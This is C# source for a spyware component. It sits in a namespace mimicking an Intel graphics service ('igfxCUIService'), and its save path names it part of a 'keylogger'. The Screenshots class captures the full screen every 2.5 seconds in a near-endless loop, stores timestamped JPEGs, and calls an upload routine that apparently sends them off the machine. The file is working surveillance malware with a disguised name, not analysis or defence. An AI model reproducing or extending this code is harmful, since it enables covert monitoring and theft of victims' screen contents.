using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;

namespace igfxCUIService
{
    class Screenshots
    {
        #region[screenshots]

        #region[variable]
        public static DateTime datum = DateTime.Now;
        public static decimal hour;
        public static decimal minuten;
        public static decimal seconde;
        public static string folderName = @"D:/keylogger/screenshot/";
        public static string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
        #endregion

        #region [ aantal screenshots]
        public static void Aantalscreenshots()
        {
            for (int i = 0; i < 500000000; i++)
            {
                DateTime TimeNow = DateTime.Now;
                hour = TimeNow.Hour;
                minuten = TimeNow.Minute;
                seconde = TimeNow.Second;
                Printscreen();
            }
        }

        #endregion

        #region [printscreens]
        private static void Printscreen()
        {
            Thread.Sleep(2500);
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                
                System.IO.Directory.CreateDirectory(pathString);
                bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);
                Upload.Screenshotsupload();
            }
        }

        #endregion

        #endregion
    }
}
